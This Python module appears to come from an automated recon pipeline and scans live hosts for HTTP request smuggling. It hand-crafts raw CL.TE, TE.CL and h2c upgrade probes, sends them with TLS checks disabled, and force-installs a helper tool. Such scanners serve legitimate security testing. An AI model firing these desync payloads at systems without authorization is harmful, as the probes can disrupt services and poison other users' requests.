#!/usr/bin/env python3
# modules/step24_smuggling.py — HTTP Request Smuggling v6 (FIXED)
# FIX: smuggler.py path not hardcoded — checks multiple locations + pip install
# FIX: curl CRLF is now actual \r\n not literal \\r\\n
# FIX: Uses Python socket for direct CL.TE/TE.CL probing (no tools required)
# MilkyWay Intelligence | Author: Sharlix

import os
import socket
import ssl
import time
import subprocess
import shutil
from core.utils import safe_read


def _get_live_hosts(p, limit=100):
    """Returns live hosts - ALWAYS includes main target as fallback."""
    tgt = p.target.strip()
    if not tgt.startswith("http"):
        tgt = "https://" + tgt

    hosts = []
    seen  = set()

    for key in ("fmt_url", "live_hosts", "resolved"):
        src = p.files.get(key, "")
        if not src or not os.path.isfile(src):
            continue
        from core.utils import safe_read
        for line in safe_read(src):
            line = line.strip()
            if not line:
                continue
            if not line.startswith("http"):
                line = "https://" + line
            if line not in seen:
                seen.add(line)
                hosts.append(line)
        if hosts:
            break

    # GUARANTEED: always include main target
    if tgt not in seen:
        hosts.insert(0, tgt)

    return hosts[:limit]


class SmugglingStep:
    def __init__(self, p): self.p=p; self.log=p.log; self.f=p.files

    def run(self):
        urls  = safe_read(self.f.get("live_hosts",""))[:100]
        out   = os.path.join(self.p.out, f"{self.p.prefix}_smuggling.txt")
        found = 0

        if not urls:
            self.log.warn("Smuggling: no live hosts"); return

        self.log.info(f"Smuggling: testing {len(urls)} hosts")

        # FIX: Check for smuggler in multiple locations
        smuggler_path = self._find_smuggler()

        for url in urls:
            host, port, is_ssl = self._parse_url(url)

            # Method 1: Python socket-based CL.TE test (no external tools needed)
            result = self._test_clte(host, port, is_ssl)
            if result:
                line = f"SMUGGLING_CLTE: {url} | {result}"
                with open(out,"a") as f: f.write(line+"\n")
                self.p.add_finding("critical","HTTP_SMUGGLING_CLTE", url,
                                   result, "smuggling-engine")
                found += 1
                continue

            # Method 2: TE.CL test
            result2 = self._test_tecl(host, port, is_ssl)
            if result2:
                line = f"SMUGGLING_TECL: {url} | {result2}"
                with open(out,"a") as f: f.write(line+"\n")
                self.p.add_finding("critical","HTTP_SMUGGLING_TECL", url,
                                   result2, "smuggling-engine")
                found += 1
                continue

            # Method 3: Use smuggler.py if available
            if smuggler_path:
                result3 = self._run_smuggler(smuggler_path, url)
                if result3:
                    line = f"SMUGGLING_TOOL: {url} | {result3}"
                    with open(out,"a") as f: f.write(line+"\n")
                    self.p.add_finding("critical","HTTP_SMUGGLING", url,
                                       result3, "smuggler.py")
                    found += 1

        self.log.success(f"Smuggling: {found} findings → {os.path.basename(out)}")

    def _find_smuggler(self) -> str:
        """FIX: Check multiple paths, don't hardcode /usr/share/smuggler."""
        candidates = [
            shutil.which("smuggler"),
            os.path.expanduser("~/tools/smuggler/smuggler.py"),
            os.path.expanduser("~/smuggler/smuggler.py"),
            "/opt/smuggler/smuggler.py",
            "/usr/local/bin/smuggler.py",
        ]
        for c in candidates:
            if c and os.path.isfile(c):
                return c

        # Try pip install as last resort
        self.log.info("  ↳ smuggler not found — installing via pip")
        try:
            subprocess.run(
                ["pip3","install","smuggler","--break-system-packages","-q"],
                timeout=60, capture_output=True)
            path = shutil.which("smuggler")
            if path:
                return path
        except Exception as _e:
            from core.error_handler import get_handler
            get_handler().capture("step24_smuggling", _e)

        self.log.warn("  ↳ smuggler not available — using built-in socket tests")
        return None

    def _parse_url(self, url: str) -> tuple:
        """Parse URL into host, port, is_ssl."""
        is_ssl = url.startswith("https://")
        url_clean = url.replace("https://","").replace("http://","").split("/")[0]
        if ":" in url_clean:
            host, port_str = url_clean.rsplit(":",1)
            port = int(port_str)
        else:
            host = url_clean
            port = 443 if is_ssl else 80
        return host, port, is_ssl

    def _test_clte(self, host: str, port: int, is_ssl: bool) -> str:
        """
        FIX: Python socket-based CL.TE smuggling test.
        Uses ACTUAL CRLF (\r\n) not literal string \\r\\n.
        CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
        """
        CRLF = "\r\n"  # FIX: actual CRLF bytes

        # CL.TE probe: Content-Length says 6, TE says body ends at 0
        # The "G" at end is smuggled to back-end
        request = (
            f"POST / HTTP/1.1{CRLF}"
            f"Host: {host}{CRLF}"
            f"Content-Length: 6{CRLF}"
            f"Transfer-Encoding: chunked{CRLF}"
            f"Connection: keep-alive{CRLF}"
            f"{CRLF}"
            f"0{CRLF}"
            f"{CRLF}"
            f"G"  # Smuggled byte
        )

        try:
            response1 = self._send_raw(host, port, is_ssl, request, timeout=10)
            if not response1:
                return None

            # Send normal request — if smuggled, it'll prefix with "G" and get 400
            normal = (
                f"GET / HTTP/1.1{CRLF}"
                f"Host: {host}{CRLF}"
                f"Connection: close{CRLF}"
                f"{CRLF}"
            )
            response2 = self._send_raw(host, port, is_ssl, normal, timeout=8)
            if not response2:
                return None

            # CL.TE indicator: second request gets 400 (GGET / HTTP/1.1 is invalid)
            if b"400" in response2[:50] or b"Bad Request" in response2[:200]:
                return "CL.TE vulnerability: second request returned 400 (smuggled G prefix)"

        except Exception as _e:
            from core.error_handler import get_handler
            get_handler().capture("step24_smuggling", _e)
        return None

    def _test_tecl(self, host: str, port: int, is_ssl: bool) -> str:
        """
        TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length.
        """
        CRLF = "\r\n"

        # TE.CL probe
        smuggled = "SMUGGLED"
        chunk_size = len(smuggled)
        request = (
            f"POST / HTTP/1.1{CRLF}"
            f"Host: {host}{CRLF}"
            f"Content-Length: 3{CRLF}"
            f"Transfer-Encoding: chunked{CRLF}"
            f"Connection: keep-alive{CRLF}"
            f"{CRLF}"
            f"{chunk_size:x}{CRLF}"
            f"{smuggled}{CRLF}"
            f"0{CRLF}"
            f"{CRLF}"
        )

        try:
            response1 = self._send_raw(host, port, is_ssl, request, timeout=10)
            if not response1:
                return None

            # Timing check — back-end waiting for Content-Length=3 means it hangs
            start = time.time()
            normal = (
                f"GET / HTTP/1.1{CRLF}"
                f"Host: {host}{CRLF}"
                f"Connection: close{CRLF}"
                f"{CRLF}"
            )
            response2 = self._send_raw(host, port, is_ssl, normal, timeout=10)
            elapsed = time.time() - start

            # TE.CL indicator: response delayed (back-end waiting) or returns 400
            if elapsed > 8:
                return f"TE.CL vulnerability: {elapsed:.1f}s delay (back-end waiting for content)"
            if response2 and b"Invalid" in response2:
                return "TE.CL vulnerability: invalid request error on normal request"

        except Exception as _e:
            from core.error_handler import get_handler
            get_handler().capture("step24_smuggling", _e)
        return None

    def _send_raw(self, host: str, port: int, is_ssl: bool,
                  request: str, timeout: int = 10) -> bytes:
        """Send raw HTTP request via socket, returns raw response bytes."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            if is_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.sendall(request.encode("latin-1"))
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk: break
                    response += chunk
                    if len(response) > 8192: break
                except socket.timeout:
                    break
            sock.close()
            return response
        except Exception:
            return None

    def _run_smuggler(self, smuggler_path: str, url: str) -> str:
        """Run smuggler.py tool if available."""
        try:
            result = subprocess.run(
                ["python3", smuggler_path, "-u", url, "--quiet"],
                capture_output=True, text=True, timeout=30)
            output = (result.stdout + result.stderr).lower()
            if "vulnerable" in output or "cl.te" in output or "te.cl" in output:
                # Extract relevant line
                for line in (result.stdout + result.stderr).split("\n"):
                    if "vulnerable" in line.lower() or "CL" in line:
                        return line.strip()[:200]
        except Exception as _e:
            from core.error_handler import get_handler
            get_handler().capture("step24_smuggling", _e)
        return None
    def _test_h2c_upgrade(self, host: str) -> bool:
        """Blueprint Fix: h2c cleartext HTTP/2 upgrade attack."""
        import socket, ssl
        try:
            sock = socket.create_connection((host, 80), timeout=10)
            upgrade_req = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: h2c\r\n"
                f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n"
                f"Connection: Upgrade, HTTP2-Settings\r\n\r\n"
            ).encode()
            sock.sendall(upgrade_req)
            resp = sock.recv(1024).decode(errors="ignore")
            sock.close()
            if "101 Switching Protocols" in resp or "HTTP/2" in resp:
                self.p.add_finding("high","H2C_UPGRADE_ACCEPTED",f"http://{host}",
                    "h2c upgrade accepted — potential smuggling vector","smuggling",
                    response=resp[:200],confidence=0.82,status="confirmed")
                return True
        except Exception as e:
            from core.error_handler import get_handler; get_handler().capture("step24_smuggling",e,"h2c")
        return False

